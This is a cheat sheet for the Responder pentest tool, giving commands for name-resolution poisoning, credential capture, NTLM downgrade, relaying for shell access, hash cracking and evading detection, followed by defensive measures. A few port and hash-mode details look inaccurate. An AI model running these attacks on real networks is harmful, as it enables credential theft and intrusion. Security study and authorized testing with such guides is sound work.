# Responder: Comprehensive Cheat Sheet

## Table of Contents
1. [Introduction](#introduction)
2. [Understanding the Protocols](#understanding-the-protocols)
   - [LLMNR](#llmnr)
   - [NBT-NS](#nbt-ns)
   - [MDNS](#mdns)
   - [DHCP](#dhcp)
3. [Installation and Setup](#installation-and-setup)
4. [Basic Usage](#basic-usage)
5. [Attack Scenarios](#attack-scenarios)
   - [Attack 1: LLMNR/NBT-NS Poisoning through SMB](#attack-1-llmnrnbt-ns-poisoning-through-smb)
   - [Attack 2: LLMNR/NBT-NS Poisoning through WPAD](#attack-2-llmnrnbt-ns-poisoning-through-wpad)
   - [Basic Authentication Mode](#basic-authentication-mode)
   - [NTLM Downgrading](#ntlm-downgrading)
   - [External IP Poisoning](#external-ip-poisoning)
   - [DNS Injection in DHCP Response](#dns-injection-in-dhcp-response)
6. [Advanced Techniques](#advanced-techniques)
   - [Analyze Mode](#analyze-mode)
   - [Multi-Relay for Shell Access](#multi-relay-for-shell-access)
7. [Responder's Servers](#responders-servers)
   - [SMB Server](#smb-server)
   - [HTTP/HTTPS Servers](#httphttps-servers)
   - [DNS Server](#dns-server)
   - [FTP Server](#ftp-server)
   - [RDP Server](#rdp-server)
   - [WinRM Server](#winrm-server)
8. [Command Reference Sheet](#command-reference-sheet)
9. [Log File Locations and Formats](#log-file-locations-and-formats)
   - [Hash Log Files](#hash-log-files)
   - [Session Log](#session-log)
   - [Analyzing Log Content](#analyzing-log-content)
10. [Real-World Usage Scenarios](#real-world-usage-scenarios)
    - [Internal Network Penetration Testing](#1-internal-network-penetration-testing)
    - [Active Directory Assessment](#2-active-directory-assessment)
    - [Social Engineering Campaigns](#3-social-engineering-campaigns)
11. [Cracking Captured Hashes](#cracking-captured-hashes)
12. [Common Issues and Troubleshooting](#common-issues-and-troubleshooting)
13. [Practical Considerations](#practical-considerations)
    - [Ethics and Legal Aspects](#ethics-and-legal-aspects)
    - [Detection Awareness](#detection-awareness)
    - [Integration with Other Tools](#integration-with-other-tools)
    - [Performance Optimization](#performance-optimization)
14. [Defensive Measures](#defensive-measures)

## Introduction

Responder is a powerful tool used by penetration testers and red teamers for lateral movement across networks. It specializes in poisoning various Windows name resolution protocols like LLMNR, NBT-NS, and MDNS to capture authentication credentials and perform other network attacks.

Created initially by SpiderLabs and now maintained by Laurent Gaffie (lgandx), Responder is particularly effective in Active Directory environments where it can exploit default Windows behaviors to capture NTLM hashes.

## Understanding the Protocols

### LLMNR
**Link-Local Multicast Name Resolution (LLMNR)** is a protocol that allows name resolution without requiring a DNS server. When a system cannot resolve a hostname through DNS, it sends a multicast packet asking if any host on the local network knows the address.

- **Port**: UDP 5355
- **Process**: Host sends a multicast query to all devices on the network
- **Purpose**: Fallback name resolution when DNS fails
- **Security Issue**: Anyone on the network can respond claiming to be the requested resource

### NBT-NS
**NetBIOS Name Service (NBT-NS)** is an older Windows protocol used to translate NetBIOS names to IP addresses on local networks.

- **Port**: UDP 137
- **Process**: Similar to LLMNR but uses NetBIOS names
- **Purpose**: Legacy hostname resolution
- **Security Issue**: Predecessor to LLMNR with similar security flaws

### MDNS
**Multicast DNS (mDNS)** also helps with name resolution in networks but works differently than both LLMNR and NBT-NS.

- **Process**: Multicasts queries to all clients in a network directly
- **Purpose**: Name resolution without centralized servers
- **Security Issue**: Vulnerable to similar poisoning attacks

### DHCP
**Dynamic Host Configuration Protocol (DHCP)** assigns IP addresses and network configuration information to devices.

- **Purpose**: Provides IP addresses, subnet masks, gateways, etc.
- **Security Issue**: Windows uses multiple custom DHCP options like NetBIOS and WPAD that can be exploited

## Installation and Setup

Responder comes pre-installed on Kali Linux. If you need to install it manually:

```bash
# Clone the repository
git clone https://github.com/lgandx/Responder.git

# Navigate to the directory
cd Responder
```

For Windows environments, Responder.exe is available at: https://github.com/lgandx/Responder/tree/master/tools

## Basic Usage

The basic syntax for running Responder:

```bash
responder -I <interface> [options]
```

Important options:
- `-I`: Specify the network interface to listen on (required)
- `-h`: Display help menu
- `-A`: Analyze mode (passive, doesn't poison)
- `-w`: Start the WPAD rogue proxy server
- `-F`: Force NTLM authentication
- `-b`: Enable basic HTTP authentication
- `-d`: Enable DHCP poisoning
- `-D`: Enable DNS server and DHCP-DNS poisoning
- `-e`: Specify an external IP for poisoning responses
- `--lm`: Force LM hashing downgrade
- `--disable-ess`: Disable Extended Session Security

## Attack Scenarios

### Attack 1: LLMNR/NBT-NS Poisoning through SMB

**Concept**: When a Windows system tries to access a non-existent SMB share, it sends an LLMNR/NBT-NS query to the entire network. Responder answers this query, pretending to be the requested resource, and captures the authentication hash.

**Steps**:
1. Start Responder:
   ```bash
   responder -I eth0
   ```

2. When a victim tries to access a non-existent share (e.g., `\\fakeshare`), Responder:
   - Detects the LLMNR broadcast
   - Responds claiming to be "fakeshare"
   - Forces the victim to attempt authentication
   - Captures the NTLM hash when authentication is attempted

3. The captured hash is stored in:
   ```
   /usr/share/responder/logs/
   ```

**Why it works**: Windows attempts to find resources using increasingly broad methods, starting with DNS and falling back to LLMNR/NBT-NS broadcasts that any device on the network can answer.

### Attack 2: LLMNR/NBT-NS Poisoning through WPAD

**Concept**: Web Proxy Auto-Discovery (WPAD) is used by browsers to automatically locate proxy configuration files. When browsers have "automatic configuration detection" enabled, they'll search for a WPAD server when accessing invalid URLs.

**Steps**:
1. Start Responder with WPAD and DHCP options:
   ```bash
   responder -I eth0 -wd
   ```

2. When a victim tries to access an invalid URL in their browser, Responder:
   - Sets up a rogue WPAD proxy server
   - Injects its IP as the WPAD server in DHCP responses
   - Forces NTLM authentication
   - Captures the credential hash

**Why it works**: Browsers with automatic proxy configuration enabled will attempt to find a WPAD server through various methods including LLMNR/NBT-NS when they can't resolve a domain name.

### Basic Authentication Mode

**Purpose**: Capture cleartext credentials instead of NTLM hashes.

**Command**:
```bash
responder -I eth0 -wdF -b
```

**Process**:
- `-b` flag enables basic HTTP authentication
- `-F` forces authentication
- When combined with WPAD (`-w`), victims get a basic auth prompt that sends credentials in cleartext

**Why use it**: While NTLM hashes need to be cracked, basic authentication captures credentials directly in plaintext.

### NTLM Downgrading

**Purpose**: Reduce the complexity of captured NTLM hashes to make them easier to crack.

**Command**:
```bash
responder -I eth0 -wdF --lm --disable-ess
```

**Process**:
- `--disable-ess` removes Extended Session Security (ESS) from NTLM authentication
- `--lm` attempts to force downgrade to NTLM version 1 (may not work on newer Windows versions)

**Why use it**: Downgraded hashes are often faster to crack with tools like Hashcat.

### External IP Poisoning

**Purpose**: Make poisoned responses appear to come from a different IP address.

**Command**:
```bash
responder -I eth0 -e 192.168.1.2
```

**Process**:
- `-e` specified IP will be used in poisoned responses instead of your actual IP
- Creates stealth and can help bypass certain security controls

**Why use it**: Useful for evading detection or directing traffic to another compromised system.

### DNS Injection in DHCP Response

**Purpose**: Poison DHCP responses with a rogue DNS server IP.

**Command**:
```bash
responder -I eth0 -D
```

**Process**:
- Responder intercepts DHCP discovery broadcasts
- Injects its own IP as the DNS server in DHCP responses
- Redirects all DNS queries through Responder's rogue DNS server

**Why use it**: Provides broader control over name resolution beyond just LLMNR/NBT-NS.

## Advanced Techniques

### Analyze Mode

**Purpose**: Passively monitor the network for LLMNR/NBT-NS traffic without poisoning.

**Command**:
```bash
responder -I eth0 -A
```

**Benefits**:
- Gather information about network traffic without triggering alerts
- Identify potential targets
- Collect data about DC names, OS versions, and user account names

**Why use it**: Reconnaissance phase before active attacks to reduce noise and chances of detection.

### Multi-Relay for Shell Access

**Purpose**: Relay captured authentication to other systems on the network to gain shell access.

**Prerequisites**:
1. Install dependencies:
   ```bash
   apt-get install gcc-mingw-w64-x86-64
   ```

2. Compile necessary binaries:
   ```bash
   x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
   x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
   ```

3. Install Python requirements:
   ```bash
   curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
   python get-pip.py
   pip install pycryptodome
   ```

4. Verify target has SMB signing disabled:
   ```bash
   nmap -p445 --script=smb-security-mode <target_ip>
   ```

**Steps**:
1. Disable HTTP and SMB servers in Responder config:
   - Edit `/usr/share/responder/Responder.conf`
   - Set `HTTP = Off` and `SMB = Off`

2. Start MultiRelay:
   ```bash
   cd /usr/share/responder/tools
   python3 MultiRelay.py -t <target_ip> -u ALL
   ```

3. Start Responder:
   ```bash
   responder -I eth0
   ```

4. When a victim attempts to access a non-existent share, MultiRelay:
   - Receives the authentication attempt
   - Forwards it to the target system
   - Uploads and executes a payload to gain shell access

**Why it works**: Authentication relay attacks use legitimate credentials from one source and forward them to authenticate to another system.

## Responder's Servers

Responder runs multiple rogue servers simultaneously to handle different types of authentication attempts:

### SMB Server
- **Purpose**: Capture authentication attempts to SMB shares
- **Default Port**: TCP 445
- **Usage**: Primary method for LLMNR/NBT-NS poisoning
- **Data Captured**: NTLM authentication hashes

### HTTP/HTTPS Servers
- **Purpose**: Handle web-based authentication and WPAD requests
- **Default Ports**: TCP 80/443
- **Usage**: WPAD attacks, capturing basic auth credentials
- **Data Captured**: NTLM hashes or cleartext credentials

### DNS Server
- **Purpose**: Respond to DNS queries when using DHCP poisoning
- **Default Port**: UDP 53
- **Usage**: DHCP-DNS poisoning attacks
- **Data Captured**: Redirects traffic to other rogue servers

### FTP Server
- **Purpose**: Capture FTP authentication attempts
- **Default Port**: TCP 21
- **Usage**: When victims attempt to connect via FTP
- **Data Captured**: NTLM hashes or cleartext credentials if using basic auth

### RDP Server
- **Purpose**: Capture Remote Desktop authentication attempts
- **Default Port**: TCP 3389
- **Usage**: When victims attempt RDP connections
- **Data Captured**: NTLM hashes

### WinRM Server
- **Purpose**: Capture Windows Remote Management authentication
- **Default Port**: TCP 5985/5986
- **Usage**: When PowerShell remoting is attempted
- **Data Captured**: NTLM hashes
- **Example**: When a victim runs:
  ```powershell
  New-PSSession -ComputerName <attacker_ip> -Credential (Get-Credential)
   ```

## Command Reference Sheet

| Command | Description | Use Case |
|---------|-------------|----------|
| `responder -I eth0` | Basic usage with LLMNR/NBT-NS poisoning | Default attack to capture NTLM hashes |
| `responder -I eth0 -A` | Analyze mode (no poisoning) | Reconnaissance without leaving evidence |
| `responder -I eth0 -w` | Enable WPAD proxy server | Browser-based hash capture |
| `responder -I eth0 -wd` | WPAD with DHCP poisoning | Enhanced browser-based capture |
| `responder -I eth0 -wdF -b` | Force basic auth with WPAD | Capture cleartext credentials |
| `responder -I eth0 -wdF --lm --disable-ess` | Downgrade NTLM security | Easier-to-crack hashes |
| `responder -I eth0 -e 192.168.1.2` | External IP poisoning | Stealth operations |
| `responder -I eth0 -D` | Enable DNS in DHCP response | DNS-level poisoning |
| `python3 MultiRelay.py -t 192.168.1.3 -u ALL` | Relay for shell access | Direct system compromise |

## Log File Locations and Formats

Responder automatically creates detailed logs of each session in the `/usr/share/responder/logs/` directory. Understanding these logs is crucial for effective use:

### Hash Log Files
- **Format**: `[Protocol]-[Version]-[IP].txt`
- **Examples**:
  - `SMB-NTLMv2-192.168.1.5.txt` - SMB authentication from 192.168.1.5
  - `HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt` - HTTP authentication with IPv6
  - `MSSQL-NTLMv2-192.168.1.10.txt` - MSSQL authentication attempt

### Session Log
- **File**: `Responder-Session.log`
- **Contains**: Detailed information about all poisoning attempts, successful or not
- **Usage**: Review for troubleshooting and understanding attack flow

### Analyzing Log Content
Hash log files contain the actual NTLM hashes in a format ready for tools like Hashcat:
```
username::domain:challenge:NTLM response:blob
```

## Real-World Usage Scenarios

### 1. Internal Network Penetration Testing
During internal penetration tests, Responder is invaluable for:
- Initial credential harvesting
- Moving laterally between network segments
- Demonstrating the risk of default Windows configurations

### 2. Active Directory Assessment
In AD environments, use Responder to:
- Identify misconfigured workstations
- Capture service account credentials
- Demonstrate the impact of poor network segmentation

### 3. Social Engineering Campaigns
Combine with social engineering by:
- Sending emails with links to non-existent shares
- Creating fake error pages that prompt for re-authentication
- Directing users to resources that trigger WPAD lookups

## Common Issues and Troubleshooting

1. **Responder not capturing hashes**:
   - Ensure you're on the same network segment as the victim
   - Check that the specified interface (-I) is correct
   - Verify that no other tools are binding to the required ports

2. **MultiRelay not working**:
   - Confirm SMB signing is disabled on the target
   - Ensure HTTP and SMB are disabled in Responder.conf
   - Check compilation of support binaries

3. **Errors about binding to ports**:
   - Another service may be using required ports
   - Run as root/administrator
   - Check if another instance of Responder is running

4. **Failed authentication attempts**:
   - User may have entered incorrect credentials
   - Target system might have security controls blocking the relay

5. **Lower success rate in newer Windows versions**:
   - Newer Windows versions implement additional security measures
   - Consider combining with other attack vectors
   - Try using different attack modes (SMB vs WPAD)

6. **Hashcat not cracking hashes**:
   - Verify you're using the correct hash mode (-m option)
   - Try a more comprehensive wordlist
   - Consider using rules to increase success probability
   - For complex passwords, GPU acceleration is recommended

## Practical Considerations

### Ethics and Legal Aspects
- **Authorization**: Always obtain proper authorization before running Responder on any network
- **Scope**: Limit activities to the defined scope of your assessment
- **Documentation**: Document all actions and findings thoroughly
- **Data Handling**: Treat captured credentials with appropriate security controls

### Detection Awareness
Understanding how Responder might be detected helps both attackers and defenders:

1. **Network Signatures**:
   - Unusual LLMNR/NBT-NS responses
   - Multiple authentication attempts to a single host
   - Traffic on multiple service ports from a single IP

2. **Host-Based Detection**:
   - Authentication to non-existent resources
   - Failed authentications to multiple services
   - Authentication prompts from unexpected sources

3. **Minimizing Detection**:
   - Use `-A` analyze mode initially to understand the environment
   - Target specific users with MultiRelay (`-u` option)
   - Limit the attack duration to avoid pattern recognition
   - Consider the `-e` external IP option for misdirection

### Integration with Other Tools
Responder works well with other penetration testing tools:

1. **Impacket Suite**:
   - Use captured hashes with tools like `secretsdump.py`
   - Perform Pass-the-Hash attacks with `psexec.py`
   - Further exploitation with `wmiexec.py`

2. **Metasploit Framework**:
   - Import captured hashes for use with modules
   - Set up listeners for shells from MultiRelay
   - Leverage gained access for further exploitation

3. **CrackMapExec**:
   - Validate captured credentials across the network
   - Perform lateral movement with authenticated access
   - Map network resources using valid credentials

### Performance Optimization
For busy networks or large-scale assessments:

1. **Targeting Specific Protocols**:
   - Disable unnecessary servers in Responder.conf
   - Focus on protocols most likely to succeed in the environment

2. **Resource Management**:
   - Monitor system resources when running for extended periods
   - Consider distributed hash cracking for large captures
   - Implement filtering to focus on high-value targets

3. **Automation Opportunities**:
   - Create scripts to automate the workflow from capture to cracking
   - Set up filters to prioritize administrative accounts
   - Develop custom reporting for easier analysis

## Cracking Captured Hashes

After collecting NTLM hashes, use Hashcat to crack them:

```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
```

Where:
- `-m 5600` specifies the hash type (NTLMv2)
- `<hash_file>` is the path to your captured hash file
- The last parameter is the path to your wordlist

For other NTLM hash types:
- NTLMv1: `-m 5500`
- NetNTLMv1: `-m 5550`
- NetNTLMv2: `-m 5600` (most common from Responder)

## Defensive Measures

To protect against Responder attacks:

1. **Disable LLMNR and NBT-NS**:
   - Via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
   - Via Registry: 
     ```
     reg add "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v "EnableMulticast" /t REG_DWORD /d "0" /f
     ```

2. **Implement Network Access Control**:
   - Restrict which devices can connect to the network
   - Use 802.1X authentication for network access

3. **Use Strong Passwords**:
   - Complex passwords are harder to crack even if hashes are captured
   - Consider password length of 14+ characters

4. **Mitigate WPAD Attacks**:
   - Add a legitimate WPAD entry in your DNS server
   - Disable automatic proxy discovery in browsers
   - Block outbound traffic on UDP 137, 138, 1900, and TCP 5355

5. **Enable SMB Signing**:
   - Prevents SMB relay attacks
   - Via Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network client: Digitally sign communications (always) → Enabled

6. **Monitor Network Traffic**:
   - Look for unusual authentication attempts
   - Monitor for multiple failed authentication attempts

